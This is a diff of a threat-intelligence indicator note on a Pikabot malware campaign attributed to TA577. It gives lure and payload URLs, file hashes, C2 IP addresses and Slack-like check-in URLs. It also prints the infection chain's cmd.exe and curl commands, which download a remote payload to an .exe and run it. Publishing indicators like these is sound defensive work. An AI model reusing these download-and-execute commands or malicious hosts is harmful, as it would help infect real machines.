@@ -1,50 +1,135 @@
-08.02.2024 | Pikabot | TA577 | 1.8.32-beta
+09.02.2024 | Pikabot | TA577 | 1.8.32-beta
 
 *************************************************
 
-.url https://entrevientos.com.ar/ccq/
-.zip 2f66fb872c9699e04e54e5eaef982784b393a5ea260129a1e2484dd273a5a88b
-.dll ca5fb5814ec62c8f04936740aabe2664b3c7d036203afbd8425cd67cf1f4b79d
+.url https://cursosrdg.ccr.edu.pe/9nqrm/
+.zip a76ea4031064781902050026aabd55cc510577e3d31ca5908e92a35129cc2ce0
+.js 88c88cb96ee1124683bc3518d2dccb529bd850e7cec402db8839782995a63117
+.exe 555687ca3149e23ee980a3acf578e0572da556cf34c87aecf48596834d6b496f
 
 *************************************************
 
-url > zip > js > powershell > .dll
+url > zip > js > curl > .dll
 
-wscript.exe C:\Users\Admin\AppData\Local\Temp\Opc.js
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Notekx.js
 
-powershell.exe Invoke-WebRequest https://gloverstech.com/tJWz9/0.765330512761959.dat -OutFile C:\Users\Public\Jrdhtjydhjf.exe; saps C:\Users\Public\Jrdhtjydhjf.exe
+cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl https://ealthygradi.com/tS5/0.02608313237231047.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
 
-powershell.exe Invoke-WebRequest 0.7206831031999564.dat -OutFile C:\Users\Public\Jrdhtjydhjf.exe; saps C:\Users\Public\Jrdhtjydhjf.exe
+curl https://ealthygradi.com/tS5/0.02608313237231047.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
 
-C:\Users\Admin\AppData\Local\Temp\Jrdhtjydhjf.exe
+cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl 0.9607346891162636.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
 
-ctfmon.exe -p 1234
+curl  0.9607346891162636.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+
+cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl 0.4946220552225169.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+
+curl  0.4946220552225169.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+
+cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl 0.9709065170996424.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+
+curl  0.9709065170996424.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+
+cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl 0.1390333043518991.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+
+curl  0.1390333043518991.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+
+cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl 0.9028512036602045.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+
+curl  0.9028512036602045.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+
+cmd.exe /c timeout 10 & C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+
+timeout  10 
 
 *************************************************
 
 **** .dll distro ****
 
-https://gloverstech.com/tJWz9/0.765330512761959.dat
+https://wealthygradi.com/tS5/0.02608313237231047.dat
+https://professionalficars.com/t6F5Gi/0.04171104253786617.dat
 
 *************************************************
 
 c2's
 
-https://158.220.80.167:2967/api/admin.emoji.add
-https://158.220.80.167:2967/api/admin.teams.settings.setIcon
-https://158.220.80.167:2967/api/admin.teams.admins.list
-https://158.220.80.167:2967/api/admin.conversations.restrictAccess.removeGroup
-https://158.220.80.167:2967/api/admin.inviteRequests.approved.list
-https://158.220.80.167:2967/api/admin.emoji.add
-
-139.84.237.229:2967
-85.239.243.155:5000
-104.129.55.104:2223
-37.60.242.85:9785
-95.179.191.137:5938
-65.20.66.218:5938
-158.220.80.157:9785
 104.129.55.103:2224
+178.18.246.136:2078
 158.220.80.167:2967
+104.129.55.104:2223
+23.226.138.161:5242
+37.60.242.85:9785
+23.226.138.143:2083
+37.60.242.86:2967
+85.239.243.155:5000
+158.220.80.157:9785
+
+HTTPS Check in
+
+https://37.60.242.86:2967/api/admin.apps.restrict
+https://23.226.138.143:2083/api/admin.apps.requests.list
+https://37.60.242.85:9785/api/admin.conversations.unarchive
+https://23.226.138.161:5242/api/admin.apps.restrict
+https://158.220.80.167:2967/api/admin.conversations.setTeams
+https://85.239.243.155:5000/api/apps.permissions.users.request
+https://37.60.242.86:2967/api/admin.usergroups.addTeams
+https://23.226.138.143:2083/api/admin.usergroups.addTeams
+https://23.226.138.161:5242/api/admin.usergroups.addTeams
+https://158.220.80.167:2967/api/admin.conversations.invite
+https://178.18.246.136:2078/api/admin.apps.restrict
+https://85.239.243.155:5000/api/admin.apps.restrict
+https://23.226.138.143:2083/api/admin.apps.restrict
+https://37.60.242.85:9785/api/admin.users.session.reset
+https://158.220.80.167:2967/api/admin.apps.requests.list
+https://178.18.246.136:2078/api/admin.conversations.unarchive
+https://85.239.243.155:5000/api/admin.users.session.reset
+https://37.60.242.86:2967/api/admin.conversations.invite
+https://23.226.138.143:2083/api/admin.users.list
+https://37.60.242.85:9785/api/admin.conversations.setTeams
+https://23.226.138.161:5242/api/admin.conversations.invite
+https://178.18.246.136:2078/api/admin.users.list
+https://37.60.242.86:2967/api/admin.conversations.unarchive
+https://23.226.138.143:2083/api/admin.conversations.unarchive
+https://37.60.242.85:9785/api/admin.usergroups.addTeams
+https://23.226.138.161:5242/api/admin.conversations.unarchive
+https://158.220.80.167:2967/api/admin.apps.restrict
+https://85.239.243.155:5000/api/admin.conversations.setTeams
+https://37.60.242.86:2967/api/admin.users.session.reset
+https://37.60.242.85:9785/api/apps.permissions.users.request
+https://23.226.138.161:5242/api/admin.usergroups.removeChannels
+https://158.220.80.167:2967/api/admin.conversations.unarchive
+https://178.18.246.136:2078/api/admin.usergroups.removeChannels
+https://37.60.242.86:2967/api/admin.conversations.setTeams
+https://23.226.138.143:2083/api/apps.permissions.users.request
+https://37.60.242.85:9785/api/admin.usergroups.removeChannels
+https://23.226.138.161:5242/api/admin.users.list
+https://158.220.80.167:2967/api/admin.usergroups.addTeams
+https://178.18.246.136:2078/api/apps.permissions.users.request
+https://85.239.243.155:5000/api/admin.conversations.invite
+https://37.60.242.86:2967/api/admin.users.list
+https://178.18.246.136:2078/api/admin.users.session.reset
+https://85.239.243.155:5000/api/admin.users.setOwner
+https://37.60.242.86:2967/api/admin.apps.requests.list
+https://37.60.242.85:9785/api/admin.apps.requests.list
+https://23.226.138.161:5242/api/admin.users.setOwner
+https://158.220.80.167:2967/api/admin.users.setOwner
+https://23.226.138.143:2083/api/admin.users.session.reset
+https://158.220.80.167:2967/api/admin.usergroups.removeChannels
+https://85.239.243.155:5000/api/admin.usergroups.removeChannels
+https://85.239.243.155:5000/api/admin.conversations.unarchive
+https://37.60.242.86:2967/api/admin.usergroups.removeChannels
+https://23.226.138.143:2083/api/admin.usergroups.removeChannels
+https://37.60.242.85:9785/api/admin.apps.restrict
+https://23.226.138.161:5242/api/admin.apps.requests.list
+https://37.60.242.85:9785/api/admin.users.setOwner
+https://85.239.243.155:5000/api/admin.users.list
+https://37.60.242.85:9785/api/admin.users.list
+https://158.220.80.167:2967/api/admin.users.session.reset
+https://178.18.246.136:2078/api/admin.conversations.invite
+https://23.226.138.161:5242/api/apps.permissions.users.request
+https://158.220.80.167:2967/api/apps.permissions.users.request
+https://178.18.246.136:2078/api/admin.apps.requests.list
+https://37.60.242.86:2967/api/apps.permissions.users.request
+https://158.220.80.167:2967/api/admin.users.list
+https://85.239.243.155:5000/api/admin.conversations.setTeams
 
 *************************************************
